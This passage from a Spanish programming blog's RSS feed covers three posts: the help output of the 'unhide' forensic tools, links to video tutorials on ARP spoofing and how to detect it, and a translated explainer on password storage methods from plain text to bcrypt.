License GPLv3+ : GNU GPL version &lt;span class=&#34;m&#34;&gt;3&lt;/span&gt; or later

http://www.unhide-forensics.info

Usage: ./unhide-tcp &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;options&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;

Options :
   -V          Show version and &lt;span class=&#34;nb&#34;&gt;exit&lt;/span&gt;
   -v          verbose
   -h          display this &lt;span class=&#34;nb&#34;&gt;help&lt;/span&gt;
   -f          show fuser output &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; hidden ports
   -l          show lsof output &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; hidden ports
   -o          log result into unhide-tcp.log file
   -s          use very quick version &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; server with lot of opened ports
   -n          use netstat instead of ss
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;Para mi sorpresa, he descubierto que esta herramienta está desarrollada por Jesus Yago, colaborador en un blog que leo regularmente, &lt;a href=&#34;http://www.securitybydefault.com/2013/01/unhide-20121229-is-out.html&#34; target=&#34;_blank&#34;&gt;securitybydefault&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;Las opciones de &lt;strong&gt;unhide-linux&lt;/strong&gt;:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span&gt;&lt;/span&gt;./unhide-linux --help
Unhide 20121229
Copyright © &lt;span class=&#34;m&#34;&gt;2012&lt;/span&gt; Yago Jesus &lt;span class=&#34;p&#34;&gt;&amp;amp;&lt;/span&gt; Patrick Gouin
License GPLv3+ : GNU GPL version &lt;span class=&#34;m&#34;&gt;3&lt;/span&gt; or later

http://www.unhide-forensics.info

NOTE : This version of unhide is &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; systems using Linux &amp;gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; 2.6

Usage: ./unhide-linux &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;options&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; test_list

Option :
   -V          Show version and &lt;span class=&#34;nb&#34;&gt;exit&lt;/span&gt;
   -v          verbose
   -h          display this &lt;span class=&#34;nb&#34;&gt;help&lt;/span&gt;
   -m          more checks &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;available only with procfs, checkopendir &lt;span class=&#34;p&#34;&gt;&amp;amp;&lt;/span&gt; checkchdir commands&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
   -r          use alternate sysinfo &lt;span class=&#34;nb&#34;&gt;test&lt;/span&gt; in meta-test
   -f          log result into unhide-linux.log file
   -o          same as &lt;span class=&#34;s1&#34;&gt;&amp;#39;-f&amp;#39;&lt;/span&gt;
   -d          &lt;span class=&#34;k&#34;&gt;do&lt;/span&gt; a double check in brute &lt;span class=&#34;nb&#34;&gt;test&lt;/span&gt;
Test_list :
   Test_list is one or more of the following
   Standard tests :
      brute
      proc
      procall
      procfs
      quick
      reverse
      sys
   Elementary tests :
      checkbrute
      checkchdir
      checkgetaffinity
      checkgetparam
      checkgetpgid
      checkgetprio
      checkRRgetinterval
      checkgetsched
      checkgetsid
      checkkill
      checknoprocps
      checkopendir
      checkproc
      checkquick
      checkreaddir
      checkreverse
      checksysinfo
      checksysinfo2
      checksysinfo3
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;h4 id=&#34;fuente&#34;&gt;Fuente&lt;/h4&gt;

&lt;p&gt;&lt;em&gt;Unhide Forensic Tool, Find hidden processes and ports&lt;/em&gt; »» &lt;a href=&#34;http://toolsyard.thehackernews.com/2013/02/unhide-forensic-tool-find-hidden.html&#34; target=&#34;_blank&#34;&gt;toolsyard.thehackernews.com&lt;/a&gt;&lt;/p&gt;</description>
        </item>
        
        <item>
            <title>[Vídeo tutoriales] Ataque Man in the middle</title>
            <link>https://elbauldelprogramador.com/video-tutoriales-ataque-man-in-middle/</link>
            <pubDate>Fri, 01 Jan 2016 00:00:00 +0000</pubDate>
            
            <guid>https://elbauldelprogramador.com/video-tutoriales-ataque-man-in-middle/</guid>
            <description>

&lt;p&gt;En la &lt;a href=&#34;https://elbauldelprogramador.com/esnifando-la-red-pruebas-de-seguridad/&#34;&gt;anterior entrada&lt;/a&gt; expliqué como hacer un ataque mitm para capturar el tráfico de red de un equipo.&lt;/p&gt;

&lt;p&gt;En casiDiablo ví 3 interesantes videotutoriales que quiero compartir con vosotros:&lt;/p&gt;

&lt;h3 id=&#34;vídeo-tutoriales&#34;&gt;Vídeo tutoriales&lt;/h3&gt;

&lt;p&gt;Los siguientes tres video tutoriales axplican en detalle cómo funciona el ARP Spoofing; y fueron creados por &lt;a href=&#34;http://icaix.com&#34;&gt;Miguel Angel Calvo&lt;/a&gt; (&lt;strong&gt;todos los derechos reservados&lt;/strong&gt;):&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;&lt;a href=&#34;http://casidiablo.net/videotutoriales/ARP.htm?keepThis=true&amp;amp;TB_iframe=true&amp;amp;height=635&amp;amp;width=800&#34; title=&#34;Arp Spoofing :: Conceptos básicos&#34;&gt;Ver el video 1&lt;/a&gt;&lt;/strong&gt; – Aquí se explican los conceptos básicos del ARP Spoofing (&lt;a href=&#34;http://casidiablo.net/descargar/ARP+Spooging+Video+Tutorial &amp;quot;Arp Spoofing :: Conceptos básicos (1MB&#34;&gt;descargar&lt;/a&gt;&amp;rdquo;))&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;&lt;a href=&#34;http://casidiablo.net/videotutoriales/ettercap.htm?keepThis=true&amp;amp;TB_iframe=true&amp;amp;height=635&amp;amp;width=800&#34; title=&#34;Arp Spoofing con ettercap :: Usando ettercap para envenenar la tabla ARP de las víctimas&#34;&gt;Ver el video 2&lt;/a&gt;&lt;/strong&gt; – En donde se explica el uso del &lt;a href=&#34;http://ettercap.sourceforge.net/&#34;&gt;Ettercap&lt;/a&gt; para realizar un ARP Spoofing (&lt;a href=&#34;http://casidiablo.net/descargar/Video+Tutorial+Ettercap &amp;quot;Arp Spoofing con ettercap :: Usando ettercap para envenenar la tabla ARP de las víctimas (2,1MB&#34;&gt;descargar&lt;/a&gt;&amp;rdquo;))&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;&lt;a href=&#34;http://casidiablo.net/videotutoriales/arpwatch.htm?keepThis=true&amp;amp;TB_iframe=true&amp;amp;height=635&amp;amp;width=800&#34; title=&#34;Detección del Arp Spoofing :: Usar arpwatch para detectar cambios extraños en la red&#34;&gt;Ver el video 3&lt;/a&gt;&lt;/strong&gt; – En donde nos enseñan a detectar si estamos bajo un ataque ARP Spoofing (&lt;a href=&#34;http://casidiablo.net/descargar/Video+Tutorial+arpwatch &amp;quot;Detección del Arp Spoofing :: Usar arpwatch para detectar cambios extraños en la red (2,1MB&#34;&gt;descargar&lt;/a&gt;&amp;rdquo;))&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&#34;fuente-original&#34;&gt;Fuente original:&lt;/h3&gt;

&lt;p&gt;&lt;a href=&#34;http://casidiablo.net/man-in-the-middle/&#34;&gt;casidiablo.net&lt;/a&gt;&lt;/p&gt;
</description>
        </item>
        
        <item>
            <title>Cómo se almacenan tus contraseñas en internet (y cuando la longitud  de la misma no importa)</title>
            <link>https://elbauldelprogramador.com/como-se-almacenan-tus-contrasenas-en-internet-y-cuando-la-longitud-de-la-misma-no-importa/</link>
            <pubDate>Tue, 14 Jul 2015 21:00:00 +0000</pubDate>
            
            <guid>https://elbauldelprogramador.com/como-se-almacenan-tus-contrasenas-en-internet-y-cuando-la-longitud-de-la-misma-no-importa/</guid>
            <description>&lt;figure&gt;
    &lt;img sizes=&#34;(min-width: 640px) 640px, 100vw&#34; on=&#34;tap:lightbox1&#34; role=&#34;button&#34; tabindex=&#34;0&#34; layout=&#34;responsive&#34; src=&#34;https://elbauldelprogramador.com/img/2012/07/original2.jpg&#34; alt=&#34;&#34; title=&#34;original&#34; width=&#34;640px&#34; height=&#34;360px&#34; /&gt;
&lt;/figure&gt;

&lt;p&gt;Cuando algún sitio web que usamos frecuentemente es hackeado, comprometiendo las contraseñas de los usuarios, probablemente pensemos en la seguridad online. pero, ¿Qué quiere decir realmente cuando un sitio es hackeado?, ¿y cómo podemos protegernos? A continuación se explica cómo se almacenan tus contraseñas en internet, y cómo te afecta cuando la web que usas se ve comprometida.&lt;/p&gt;

&lt;p&gt;Existen numerosas formas de almacenar contraseñas, algunas más seguras que otras. Veamos algunos de los métodos más populares, y cómo afectan a la seguridad de tus datos.&lt;/p&gt;

&lt;p&gt;&lt;!--ad--&gt;&lt;/p&gt;

&lt;h1 id=&#34;método-uno-contraseñas-en-texto-plano&#34;&gt;Método uno: Contraseñas en texto plano&lt;/h1&gt;

&lt;p&gt;&lt;strong&gt;Cómo funciona:&lt;/strong&gt; La forma más sencilla para una web de almacenar tu contraseña es en texto plano. Lo que significa que en algún lugar de sus servidores, existe una &lt;a href=&#34;https://elbauldelprogramador.com/bases-de-datos/&#34; target=&#34;_blank&#34;&gt;base de datos&lt;/a&gt; con tu usuario y contraseña escrita en un formato legible para los humanos (Si tu contraseña es &lt;code&gt;testing123&lt;/code&gt;, se almacena en la base de datos como &lt;code&gt;testing123&lt;/code&gt;). Cuando introduces tus credenciales en el sitio, se comprueban con la base de datos para ver si coinciden. Éste es claramente el peor método de todos, en términos de &lt;a href=&#34;https://elbauldelprogramador.com/categories/seguridad/&#34; target=&#34;_blank&#34;&gt;seguridad&lt;/a&gt;. La gran mayoría de sitios con reputación no usan este método. Si alguien compromete esta base de datos, las contraseñas de todo el mundo serán comprometidas inmediatamente.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;¿Importa la seguridad de mi contraseña?&lt;/strong&gt; De ninguna manera. No importa cual sea la longitud de tu contraseña o cómo de segura sea, si está almacenada en texto plano y el sitio es comprometido, tu contraseña será accesible por todo el mundo, sin ningún trabajo. Aún así, sí que importa en términos de ocultar la contraseña de amigos y conocidos, que pueden intentar adivinarla, pero no hay nada que hacer en el caso de que el sítio se vea comprometido.&lt;/p&gt;

&lt;h1 id=&#34;método-dos-cifrado-de-contraseña-básico&#34;&gt;Método dos: Cifrado de contraseña básico&lt;/h1&gt;

&lt;p&gt;&lt;strong&gt;Cómo funciona:&lt;/strong&gt; Para añadir más protección a la contraseña de la que proporciona el texto plano, la mayoría de los sítios cifran la contraseña antes de almacenarla en sus servidores. El cifrado, para aquellos que no lo sepan, usa una clave especial para convertir la contraseña a una cadena de texto aleatoria. Alguien que disponga estas cadenas aleatorias de texto, no será capaz de loggearse en tu cuenta a no ser que sepa la clave, la cual podría usar para descifrar la contraseña.&lt;/p&gt;

&lt;p&gt;El problema es que a menudo la clave se almacena en el mismo servidor en el que se encuentran las contraseñas, por lo que si el servidor se compromete, no hay gran trabajo que realizar para descifrar todas las contraseñas, con lo cual este método sigue siendo tremendamente inseguro.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;¿Importa la seguridad de mi contraseña?&lt;/strong&gt; No. Ya que es fácil descifrar la contraseña conociendo la clave, no importa cómo de segura sea tu contraseña. De nuevo: hablamos en términos de que el sítio se vea comprometido; si tienes un amigo o familiar cotilla hurgando en tus cosas, una contraseña segura puede ayudar a evitar que la adivinen.&lt;/p&gt;

&lt;h1 id=&#34;método-tres-contraseñas-con-hash&#34;&gt;Método tres: Contraseñas con Hash&lt;/h1&gt;

&lt;p&gt;&lt;strong&gt;Cómo funciona:&lt;/strong&gt; Un hash es similar al cifrado en el sentido en que también cambia la contraseña por una cadena de texto larga, formada por letras y números. Sin embargo, a diferencia del cifrado, el hash es una calle de un solo sentido: Si se dispone del hash, no es posible ejecutar el algoritmo invertidamente para obtener la contraseña original. Lo que significa que se tendrán que obtener los hashes e intentar diferentes combinaciones de contraseñas para ver cual de ellas coincide.&lt;/p&gt;

&lt;p&gt;Aún así, hay un inconveniente en este método. Aunque no se puede descodificar un hash a su contraseña original, se pueden intentar contraseñas diferentes hasta que alguna coincida con el hash que se robó de la base de datos. Los ordenadores pueden hacer esto muy muy rápido, y con la ayuda de una cosa llamada &lt;em&gt;rainbow tables (tablas de arco iris)&lt;/em&gt; &amp;#8212; que es esencialmente una lista de miles de millones de hashes diferentes y sus correspondientes contraseñas. &amp;#8212; Se puede mirar fácilmente en el hash que tenemos y ver si ya ha sido descubierta la contraseña. Puedes probrar escribiendo &lt;code&gt;e38ad214943daad1d64c102faec29de4afe9da3d&lt;/code&gt; en google. Rápidamente vemos que es el hash &lt;a href=&#34;http://es.wikipedia.org/wiki/Secure_Hash_Algorithm&#34; target=&#34;_blank&#34;&gt;SHA-1&lt;/a&gt; para &amp;#8216;password1&amp;#8242;. Para más información sobre cómo funcionan las &lt;em&gt;rainbow tables&lt;/em&gt; puedes visitar este artículo de &lt;a href=&#34;http://www.codinghorror.com/blog/2007/09/rainbow-hash-cracking.html&#34; target=&#34;_blank&#34;&gt;Jeff Atwood&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;¿Importa la seguridad de mi contraseña?&lt;/strong&gt; En este caso sí. Las &lt;em&gt;rainbow tables&lt;/em&gt; están hechas de contraseñas que ya han sido rotas, lo que significa que las contraseñas débiles se crackean rápidamente. Su mayor debilidad, sin embargo, no es la complejidad, si no la longitud. Es mejor usar contraseñas largas (como el famoso comic de &lt;a href=&#34;http://xkcd.com/936/&#34; target=&#34;_blank&#34;&gt;XKCD&lt;/a&gt; llamado &amp;#8220;correct horse battery staple&amp;#8221;) en lugar de una corta y compleja (como kj$fsDl#).&lt;/p&gt;

&lt;h1 id=&#34;método-cuatro-contraseñas-con-hash-y-una-pizca-de-sal-salt&#34;&gt;Método cuatro: Contraseñas con Hash y una pizca de sal (Salt)&lt;/h1&gt;

&lt;p&gt;&lt;em&gt;El término que normalmente se usa es salt, en lugar de su traducción, sal, sin embargo, voy a usar los dos terminos, salt y sal, para que la traducción quede comprensible&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Cómo funciona:&lt;/strong&gt; Echar sal a un hash significa añadir una cadena de caracteres aleatoria &amp;#8212; llamada &amp;#8220;salt&amp;#8221; &amp;#8212; al principio o al final de la contraseña antes de crear el hash. Se usa un salt distinto para cada contraseña, incluso si el salt se almacena en el mismo servidor, se hará realmente dificil encontrar estos hashes &amp;#8220;salteados&amp;#8221; en los rainbow tables, ya que cada uno es largo, complejo y único. LinkedIn es conocido por &lt;em&gt;no&lt;/em&gt; usar hashes salteados, de haberlos usado sus usuarios habrían estado más seguros cuando los &lt;a href=&#34;http://lifehacker.com/5916177/65-million-linkedin-accounts-may-be-compromised-change-your-passwords-now&#34; target=&#34;_blank&#34;&gt;hackearon&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;¿Importa la seguridad de mi contraseña?&lt;/strong&gt; Indudablemente, sin embargo, desafortunadamente hemos llegado a un punto en el cual los ordenadores tienen una gran capacidad de computación y pueden conseguirlo por fuerza bruta, incluso con contraseñas con salt. Puede llevar mucho tiempo &amp;#8212; más que usar rainbow tables &amp;#8212; pero aún así es factible. Lo cual significa que la seguridad de la contraseña cuenta, a más longitud y mayor complejidad, más tiempo llevará crackearla.&lt;/p&gt;

&lt;h1 id=&#34;método-cinco-hashes-lentos-slow-hashes&#34;&gt;Método cinco: Hashes lentos (&lt;em&gt;Slow Hashes&lt;/em&gt;)&lt;/h1&gt;

&lt;p&gt;&lt;strong&gt;Cómo funciona:&lt;/strong&gt; Ahora mismo, los expertos en seguridad &lt;a href=&#34;http://chargen.matasano.com/chargen/2007/9/7/enough-with-the-rainbow-tables-what-you-need-to-know-about-s.html&#34; target=&#34;_blank&#34;&gt;están apostando por los hashes lentos&lt;/a&gt; como la mejor opción para almacenar contraseñas. Funciones de hashes como MD5, SHA-1, y SHA-256 son relativamente rápidos: si introducimos una contraseña, nos devolverá el resultado hasheado rápidamente. En un ataque de fuerza bruta, el tiempo es el factor más importante. Usando hashes lentos &amp;#8212; como el algoritmo &lt;a href=&#34;http://en.wikipedia.org/wiki/Bcrypt&#34; target=&#34;_blank&#34;&gt;bcrypt&lt;/a&gt; &amp;#8212; los ataques de fuerza bruta tardarán mucho más, ya que cada contraseña necesita más tiempo para computarse.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;¿Importa la seguridad de mi contraseña?&lt;/strong&gt; De nuevo, las contraseñas seguras son más difíciles de romper por fuerza bruta, por lo tanto para este método sí que importa. Teniendo una contraseña segura tardará mucho, mucho tiempo en descubrirse.&lt;/p&gt;

&lt;h1 id=&#34;cómo-evitar-que-tu-contraseña-sea-filtrada&#34;&gt;¿Cómo evitar que tu contraseña sea filtrada?&lt;/h1&gt;

&lt;p&gt;Entonces, ¿Qué significa todo esto para el usuario? Esto es lo que deberías aprender de toda esta información:&lt;/p&gt;

&lt;ol&gt;
&lt;li&gt;&lt;strong&gt;No usar servícios con mala seguridad:&lt;/strong&gt; Aunque no podemos controloar cómo una compañía almacena nuestras contraseñas, podemos controlar con qué servícios darnos de alta. Nunca deberíamos darnos de alta con servícios que usan texto plano o cifrado para almacenar las contraseña, ya que son mucho más vulnerables. Una buena manera de averiguar lo que utilizan, de acuerdo al &lt;a href=&#34;http://blog.cloudflare.com/keeping-passwords-safe-by-staying-up-to-date&#34; target=&#34;_blank&#34;&gt;servicio web CloudFlare&lt;/a&gt;, es hacer click en el enlace &amp;#8220;no recuerdo mi contraseña&amp;#8221;. Si nos envía la contraseña en un email, significa que pueden acceder a la contraseña en sí, por lo tanto no está hasheada &amp;#8212; y probablemente esté usando alguno de los métodos más débiles. Por supuesto, siempre se puede enviarles un correo y preguntarles, o mirar su FAQ para ver si proporcionan esa información.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Usar contraseñas seguras:&lt;/strong&gt; Como hemos demostrado más arriba, una contraseña más segura, es menos probable de que alguien la descifre rápidamente. La longitud es más importante que la complejidad. Recuerda: cualquier contraseña es crackeable, lo que queremos es que lleve el mayor tiempo posible.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Cambiar de contraseña siempre que un sitio sea comprometido:&lt;/strong&gt; Incluso si nuestra contraseña es segura, no significa que sea invulnerable &amp;#8212; solo significa que llevará más tiempo. Aquellos con contraseñas débiles puede que ya tengan sus cuentas comprometidas incluso antes de darse cuenta que filtración se ha producido, pero si la contraseña necesita de días para ser crackeada, aún tenemos tiempo para cambiarla haciendo así que la contraseña antigua no sirva para nada.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Usar distintas contraseñas para cada sitio:&lt;/strong&gt; Si se usan contraseñas distintas para cada cuenta que tengamos, entonces esas cuentas estarán a salvo incluso si alguna de nuestras cuentas se compromete. Si usamos la misma contraseña para cada sitio, una vulnerabilidad en algún sitio puede significar un mundo de problemas para ti.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Usar OAuth si no estamos seguros sobre la seguridad del sitio:&lt;/strong&gt; Ya &lt;a href=&#34;https://elbauldelprogramador.com/entendiendo-oauth-que-ocurre-cuando-te-loggeas-en-un-sitio-con-google-twitter-o-facebook/&#34; target=&#34;_blank&#34;&gt;hablamos sobre OAuth antes&lt;/a&gt;, un protocolo que permite logearnos usando la cuenta de Google, Facebook o twitter. Si no sabemos cómo de seguro es un sitio, y ofrece la opción de usar OAuth, úsalo &amp;#8212; Es probable que Google, Facebook y twitter tengan mejor seguridad, y si el sitio es vulnerado, simplemente le denegamos acceso a nuestra cuenta de Google, Facebook o Twitter.&lt;/li&gt;
&lt;/ol&gt;

&lt;h2 id=&#34;más-cosas-sobre-seguridad&#34;&gt;Más cosas sobre seguridad&lt;/h2&gt;

&lt;p&gt;Dejando aparte la traducción de este artículo de LifeHacker me gustaría hablaros del tema de la seguridad en la web, del cual aprendí bastante al hacer un curso de &lt;a href=&#34;https://elbauldelprogramador.com/noticias/nuevos-cursos-disponibles-en-udacity-la-universidad-online-gratuita/&#34; target=&#34;_blank&#34;&gt;desarrollo de aplicaciones web&lt;/a&gt; en &lt;a href=&#34;https://elbauldelprogramador.com/?s=udacity&#34; target=&#34;_blank&#34;&gt;udacity&lt;/a&gt;, que impartía Steve Huffman, el creador de reddit.&lt;/p&gt;

&lt;p&gt;A lo largo del curso hay un tema dedicado al registro de usuarios donde se usan muchos de estos métodos, sobre todo el hash con salt usando SHA-256. También se habla de bcrypt, que básicamente es igual que el anterior, pero recibe como parámetro un número, que será el tiempo que la función de cifrado estará sin hacer nada, para conseguir así el objetivo de que no sea posible descifrar las contraseñas tan rápido. Os dejo unos vídeos sobre el tema y recomiendo que hagáis el curso.&lt;/p&gt;

&lt;h1 id=&#34;bcrypt&#34;&gt;Bcrypt&lt;/h1&gt;

&lt;p&gt;&lt;amp-youtube
    data-videoid=&#34;S66XVE68NCc&#34;
    layout=&#34;responsive&#34;
    width=&#34;480&#34; height=&#34;270&#34;&gt;&lt;/amp-youtube&gt;&lt;/p&gt;

&lt;h1 id=&#34;rainbow-tables&#34;&gt;Rainbow Tables&lt;/h1&gt;

&lt;p&gt;&lt;amp-youtube
    data-videoid=&#34;SOV0AeHuHaQ&#34;
    layout=&#34;responsive&#34;
    width=&#34;480&#34; height=&#34;270&#34;&gt;&lt;/amp-youtube&gt;&lt;/p&gt;

&lt;h1 id=&#34;crear-salts&#34;&gt;Crear Salts&lt;/h1&gt;

&lt;p&gt;&lt;amp-youtube
    data-videoid=&#34;hcWQNwdQVx0&#34;
    layout=&#34;responsive&#34;
    width=&#34;480&#34; height=&#34;270&#34;&gt;&lt;/amp-youtube&gt;&lt;/p&gt;

&lt;h1 id=&#34;hashear-salts&#34;&gt;Hashear Salts&lt;/h1&gt;

&lt;p&gt;&lt;amp-youtube
    data-videoid=&#34;yBN3r2Fwze8&#34;
    layout=&#34;responsive&#34;
    width=&#34;480&#34; height=&#34;270&#34;&gt;&lt;/amp-youtube&gt;&lt;/p&gt;

&lt;h1 id=&#34;validar-salts&#34;&gt;Validar Salts&lt;/h1&gt;

&lt;p&gt;&lt;amp-youtube
    data-videoid=&#34;gDLUM38mm6c&#34;
    layout=&#34;responsive&#34;
    width=&#34;480&#34; height=&#34;270&#34;&gt;&lt;/amp-youtube&gt;&lt;/p&gt;

&lt;h1 id=&#34;validar-salts-solución&#34;&gt;Validar Salts (Solución)&lt;/h1&gt;

&lt;p&gt;&lt;amp-youtube
    data-videoid=&#34;Zy6eNdzmn1w&#34;
    layout=&#34;responsive&#34;
    width=&#34;480&#34; height=&#34;270&#34;&gt;&lt;/amp-youtube&gt;&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;Imagen | de &lt;a href=&#34;http://www.shutterstock.com/pic.mhtml?id=47788978&#34; target=&#34;_blank&#34;&gt;palsur&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;Fuente | &lt;a href=&#34;http://lifehacker.com/5919918/how-your-passwords-are-stored-on-the-internet-and-when-your-password-strength-doesnt-matter&#34; target=&#34;_blank&#34;&gt;LifeHacker&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;</description>
        </item>
        
    </channel>
</rss>
